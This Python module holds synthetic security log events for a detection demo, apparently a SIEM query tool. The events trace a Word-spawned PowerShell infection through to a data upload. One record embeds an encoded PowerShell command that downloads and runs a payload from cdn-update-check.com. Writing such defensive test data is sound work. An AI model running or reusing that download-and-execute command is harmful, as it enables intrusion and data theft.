"""Synthetic security events for the demo scenario."""

ENDPOINT_EVENTS = [
    {
        "_time": "2026-05-18T09:14:10Z",
        "host": "FIN-LAPTOP-22",
        "user": "jsmith",
        "index": "endpoint",
        "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "process_name": "winword.exe",
        "parent_process_name": "explorer.exe",
        "command_line": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE" /n "\\\\fileserver\\shared\\Q2_Projections.docx"',
        "event_type": "process_create",
    },
    {
        "_time": "2026-05-18T09:16:22Z",
        "host": "FIN-LAPTOP-22",
        "user": "jsmith",
        "index": "endpoint",
        "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "process_name": "powershell.exe",
        "parent_process_name": "winword.exe",
        "command_line": "powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAtAGMAaABlAGMAawAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA",
        "event_type": "process_create",
    },
    {
        "_time": "2026-05-18T09:41:10Z",
        "host": "FIN-LAPTOP-22",
        "user": "jsmith",
        "index": "endpoint",
        "source": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        "process_name": "cmd.exe",
        "parent_process_name": "powershell.exe",
        "command_line": 'cmd /c compress -r Q2_finance_exports.zip "C:\\Users\\jsmith\\Documents\\Finance\\"',
        "target_filename": "Q2_finance_exports.zip",
        "event_type": "file_create",
    },
]

DNS_EVENTS = [
    {
        "_time": "2026-05-18T09:17:03Z",
        "host": "FIN-LAPTOP-22",
        "user": "jsmith",
        "index": "dns",
        "source": "stream:dns",
        "query": "cdn-update-check.com",
        "answer": "185.199.108.153",
        "record_type": "A",
        "first_seen_domain_days": 12,
    },
]

AUTH_EVENTS = [
    {
        "_time": "2026-05-18T09:35:44Z",
        "host": "FIN-LAPTOP-22",
        "user": "jsmith",
        "index": "wineventlog",
        "source": "XmlWinEventLog:Security",
        "dest_host": "FIN-FILE-01",
        "action": "success",
        "event_id": 4624,
        "logon_type": 3,
    },
]

PROXY_EVENTS = [
    {
        "_time": "2026-05-18T09:44:39Z",
        "host": "FIN-LAPTOP-22",
        "user": "jsmith",
        "index": "proxy",
        "source": "stream:http",
        "dest_ip": "185.199.108.153",
        "dest_port": 443,
        "bytes_out": 48593422,
        "bytes_in": 1024,
        "url": "https://185.199.108.153/upload",
        "http_method": "POST",
    },
]

FIREWALL_EVENTS = [
    {
        "_time": "2026-05-18T09:44:41Z",
        "host": "FIN-LAPTOP-22",
        "index": "firewall",
        "source": "pan:traffic",
        "src_ip": "10.10.20.45",
        "dest_ip": "185.199.108.153",
        "dest_port": 443,
        "bytes_sent": 48593422,
        "action": "allow",
        "app": "ssl",
    },
]

ALL_EVENTS = ENDPOINT_EVENTS + DNS_EVENTS + AUTH_EVENTS + PROXY_EVENTS + FIREWALL_EVENTS


def get_demo_events_for_spl(spl: str) -> list[dict]:
    """Return relevant synthetic events based on the SPL content."""
    spl_lower = spl.lower()
    events: list[dict] = []
    if "endpoint" in spl_lower or "powershell" in spl_lower or "process" in spl_lower:
        events.extend(ENDPOINT_EVENTS)
    if "dns" in spl_lower or "query" in spl_lower:
        events.extend(DNS_EVENTS)
    if "wineventlog" in spl_lower or "auth" in spl_lower or "logon" in spl_lower:
        events.extend(AUTH_EVENTS)
    if "proxy" in spl_lower or "bytes_out" in spl_lower or "http" in spl_lower:
        events.extend(PROXY_EVENTS)
    if "firewall" in spl_lower or "pan:" in spl_lower:
        events.extend(FIREWALL_EVENTS)
    return events or ALL_EVENTS
